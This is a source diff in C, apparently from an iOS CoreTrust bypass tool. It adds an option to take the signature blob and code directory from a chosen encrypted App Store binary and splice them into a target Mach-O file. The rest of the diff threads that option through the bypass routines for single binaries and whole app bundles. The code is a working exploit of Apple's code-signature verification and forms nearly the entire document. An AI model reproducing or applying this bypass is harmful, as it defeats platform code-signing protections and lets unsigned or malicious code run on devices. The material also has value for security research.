@@ -141,6 +141,7 @@ void print_usage(const char *self)
     printf("\t-r: replace input file / replace output file if it already exists\n");
     printf("\t-a: input is an .app bundle\n");
     printf("\t-t: optional 10-character team ID to use\n");
+    printf("\t-A: optional path to App Store binary to use (will use GTA Car Tracker by default)\n");
     printf("\t-h: print this help message\n");
     printf("Examples:\n");
     printf("\t%s -i <path to input MachO/FAT file> (-r) (-o <path to output MachO file>)\n", self);
@@ -148,7 +149,71 @@ void print_usage(const char *self)
     exit(-1);
 }
 
-int update_signature_blob(CS_DecodedSuperBlob *superblob)
+int extract_signature_blob_and_code_directory_from_binary(const char *inputPath, void **sigBlob, size_t *sigBlobLen, void **codeDirectoryBlob, size_t *codeDirectoryBlobLen)
+{
+    char *appStoreSlice = extract_preferred_slice(inputPath);
+    if (!appStoreSlice) {
+        printf("Error: failed to extract preferred slice!\n");
+        return -1;
+    }
+
+    MachO *macho = macho_init_for_writing(appStoreSlice);
+    if (!macho) {
+        free(appStoreSlice);
+        return -1;
+    }
+
+    if (!macho_is_encrypted(macho)) {
+        printf("Error: MachO must be an encrypted App Store binary!\n");
+        macho_free(macho);
+        free(appStoreSlice);
+        return 2;
+    }
+
+    CS_SuperBlob *superblob = macho_read_code_signature(macho);
+    if (!superblob) {
+        printf("Error: no code signature found, please fake-sign the binary at minimum before running the bypass.\n");
+        free(appStoreSlice);
+        return -1;
+    }
+
+    CS_DecodedSuperBlob *decodedSuperblob = csd_superblob_decode(superblob);
+    CS_DecodedBlob *signatureBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_SIGNATURESLOT, NULL);
+    if (!signatureBlob) {
+        printf("Error: no signature blob found!\n");
+        free(appStoreSlice);
+        return -1;
+    }
+
+    *sigBlobLen = csd_blob_get_size(signatureBlob);
+    *sigBlob = malloc(*sigBlobLen);
+    csd_blob_read(signatureBlob, 0, *sigBlobLen, *sigBlob);
+
+    CS_DecodedBlob *codeDirectory = csd_superblob_find_blob(decodedSuperblob, CSSLOT_CODEDIRECTORY, NULL);
+    if (!codeDirectory) {
+        printf("Error: no code directory found!\n");
+        free(appStoreSlice);
+        return -1;
+    }
+
+    CS_DecodedBlob *alternateCodeDirectory = csd_superblob_find_blob(decodedSuperblob, CSSLOT_ALTERNATE_CODEDIRECTORIES, NULL);
+    if (!alternateCodeDirectory) {
+        printf("Error: no alternate code directory found!\n");
+        free(appStoreSlice);
+        return -1;
+    }
+
+    *codeDirectoryBlobLen = csd_blob_get_size(codeDirectory);
+    *codeDirectoryBlob = malloc(*codeDirectoryBlobLen);
+    csd_blob_read(codeDirectory, 0, *codeDirectoryBlobLen, *codeDirectoryBlob);
+
+    csd_superblob_free(decodedSuperblob);
+    free(appStoreSlice);
+
+    return 0;
+}
+
+int update_signature_blob(CS_DecodedSuperBlob *superblob, void *appStoreSigBlob, size_t appStoreSigBlobLen)
 {
     CS_DecodedBlob *sha1CD = csd_superblob_find_blob(superblob, CSSLOT_CODEDIRECTORY, NULL);
     if (!sha1CD) {
@@ -191,9 +256,17 @@ int update_signature_blob(CS_DecodedSuperBlob *superblob)
         }
         printf("\n");
     }
-
-    const uint8_t *cmsDataPtr = AppStoreSignatureBlob + offsetof(CS_GenericBlob, data);
-    size_t cmsDataSize = AppStoreSignatureBlob_len - sizeof(CS_GenericBlob);
+    
+    const uint8_t *cmsDataPtr; 
+    size_t cmsDataSize;
+    if (appStoreSigBlob) {
+        printf("Using provided signature blob\n");
+        cmsDataPtr = appStoreSigBlob + offsetof(CS_GenericBlob, data);
+        cmsDataSize = appStoreSigBlobLen - sizeof(CS_GenericBlob);
+    } else {
+        cmsDataPtr = AppStoreSignatureBlob + offsetof(CS_GenericBlob, data);
+        cmsDataSize = AppStoreSignatureBlob_len - sizeof(CS_GenericBlob);
+    }
     CMS_ContentInfo *cms = d2i_CMS_ContentInfo(NULL, (const unsigned char**)&cmsDataPtr, cmsDataSize);
     if (!cms) {
         printf("Failed to parse CMS blob: %s!\n", ERR_error_string(ERR_get_error(), NULL));
@@ -340,7 +413,7 @@ int update_signature_blob(CS_DecodedSuperBlob *superblob)
     return csd_superblob_append_blob(superblob, signatureBlob);
 }
 
-int apply_coretrust_bypass(const char *machoPath, char *teamID)
+int apply_coretrust_bypass(const char *machoPath, char *teamID, char *appStoreBinary)
 {
     MachO *macho = macho_init_for_writing(machoPath);
     if (!macho) return -1;
@@ -401,8 +474,20 @@ int apply_coretrust_bypass(const char *machoPath, char *teamID)
     csd_blob_set_type(realCodeDirBlob, CSSLOT_ALTERNATE_CODEDIRECTORIES);
     csd_superblob_append_blob(decodedSuperblob, realCodeDirBlob);
 
+    // Extract blobs from App Store app if provided
+    void *appStoreSigBlob = NULL;
+    size_t appStoreSigBlobLen = 0;
+    void *appStoreBinaryCodeDirectoryBlob = NULL;
+    size_t appStoreBinaryCodeDirectoryBlobLen = 0;
+    if (appStoreBinary) {
+        extract_signature_blob_and_code_directory_from_binary(appStoreBinary, &appStoreSigBlob, &appStoreSigBlobLen, &appStoreBinaryCodeDirectoryBlob, &appStoreBinaryCodeDirectoryBlobLen);
+    }
+
+    if (!appStoreBinaryCodeDirectoryBlob) { appStoreBinaryCodeDirectoryBlob = AppStoreCodeDirectory; appStoreBinaryCodeDirectoryBlobLen = AppStoreCodeDirectory_len; }
+    if (!appStoreSigBlob) { appStoreSigBlob = AppStoreSignatureBlob; appStoreSigBlobLen = AppStoreSignatureBlob_len; }
+
     // Insert AppStore code directory as main code directory at the start
-    CS_DecodedBlob *appStoreCodeDirectoryBlob = csd_blob_init(CSSLOT_CODEDIRECTORY, (CS_GenericBlob *)AppStoreCodeDirectory);
+    CS_DecodedBlob *appStoreCodeDirectoryBlob = csd_blob_init(CSSLOT_CODEDIRECTORY, (CS_GenericBlob *)appStoreBinaryCodeDirectoryBlob);
     csd_superblob_insert_blob_at_index(decodedSuperblob, appStoreCodeDirectoryBlob, 0);
 
     printf("Adding new signature blob...\n");
@@ -446,7 +531,7 @@ int apply_coretrust_bypass(const char *machoPath, char *teamID)
 
     // 6. Signature blob
     printf("Doing initial signing to calculate size...\n");
-    ret = update_signature_blob(decodedSuperblob);
+    ret = update_signature_blob(decodedSuperblob, appStoreSigBlob, appStoreSigBlobLen);
     if(ret == -1) {
         printf("Error: failed to create new signature blob!\n");
         return -1;
@@ -466,7 +551,7 @@ int apply_coretrust_bypass(const char *machoPath, char *teamID)
     csd_code_directory_update(realCodeDirBlob, macho);
 
     printf("Signing binary...\n");
-    ret = update_signature_blob(decodedSuperblob);
+    ret = update_signature_blob(decodedSuperblob, appStoreSigBlob, appStoreSigBlobLen);
     if(ret == -1) {
         printf("Error: failed to create new signature blob!\n");
         return -1;
@@ -486,7 +571,7 @@ int apply_coretrust_bypass(const char *machoPath, char *teamID)
     return 0;
 }
 
-int apply_coretrust_bypass_wrapper(const char *inputPath, const char *outputPath, char *teamID)
+int apply_coretrust_bypass_wrapper(const char *inputPath, const char *outputPath, char *teamID, char *appStoreBinary)
 {
     char *machoPath = extract_preferred_slice(inputPath);
     if (!machoPath) {
@@ -495,7 +580,7 @@ int apply_coretrust_bypass_wrapper(const char *inputPath, const char *outputPath
     }
     printf("extracted best slice to %s\n", machoPath);
 
-    int r = apply_coretrust_bypass(machoPath, teamID);
+    int r = apply_coretrust_bypass(machoPath, teamID, appStoreBinary);
     if (r != 0) {
         free(machoPath);
         return r;
@@ -514,7 +599,7 @@ int apply_coretrust_bypass_wrapper(const char *inputPath, const char *outputPath
     return r;
 }
 
-int apply_coretrust_bypass_to_app_bundle(const char *appBundlePath, char *teamID) {
+int apply_coretrust_bypass_to_app_bundle(const char *appBundlePath, char *teamID, char *appStoreBinary) {
     // Recursively find all MachO files in the app bundle
     DIR *dir;
     struct dirent *entry;
@@ -538,7 +623,7 @@ int apply_coretrust_bypass_to_app_bundle(const char *appBundlePath, char *teamID
         if (S_ISDIR(statbuf.st_mode)) {
             if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
                 // Recursive call for subdirectories
-                r = apply_coretrust_bypass_to_app_bundle(fullpath, teamID);
+                r = apply_coretrust_bypass_to_app_bundle(fullpath, teamID, appStoreBinary);
             }
         } else {
             // Process file
@@ -551,7 +636,7 @@ int apply_coretrust_bypass_to_app_bundle(const char *appBundlePath, char *teamID
             memory_stream_read(stream, 0, sizeof(magic), &magic);
             if (magic == FAT_MAGIC_64 || magic == MH_MAGIC_64) {
                 printf("Applying bypass to %s.\n", fullpath);
-                r = apply_coretrust_bypass_wrapper(fullpath, fullpath, teamID);
+                r = apply_coretrust_bypass_wrapper(fullpath, fullpath, teamID, appStoreBinary);
                 if (r != 0) {
                     printf("Error: failed to apply bypass to %s\n", fullpath);
                     closedir(dir);
@@ -577,6 +662,7 @@ int main(int argc, char *argv[]) {
     bool replace = argument_exists(argc, argv, "-r");
     bool appBundle = argument_exists(argc, argv, "-a");
     char *teamID = get_argument_value(argc, argv, "-t");
+    char *appStoreBinary = get_argument_value(argc, argv, "-A");
     if (teamID) {
         if (strlen(teamID) != 10) {
             printf("Error: Team ID must be 10 characters long!\n");
@@ -603,7 +689,7 @@ int main(int argc, char *argv[]) {
 
         printf("Applying CoreTrust bypass to app bundle.\n");
         printf("CoreTrust bypass eta s0n!!\n");
-        return apply_coretrust_bypass_to_app_bundle(input, teamID);
+        return apply_coretrust_bypass_to_app_bundle(input, teamID, appStoreBinary);
     }
     
     if (!output && !replace) {
@@ -627,7 +713,7 @@ int main(int argc, char *argv[]) {
     }
 
     printf("CoreTrust bypass eta s0n!!\n");
-    return apply_coretrust_bypass_wrapper(input, output, teamID);
+    return apply_coretrust_bypass_wrapper(input, output, teamID, appStoreBinary);
 }
 
 #else
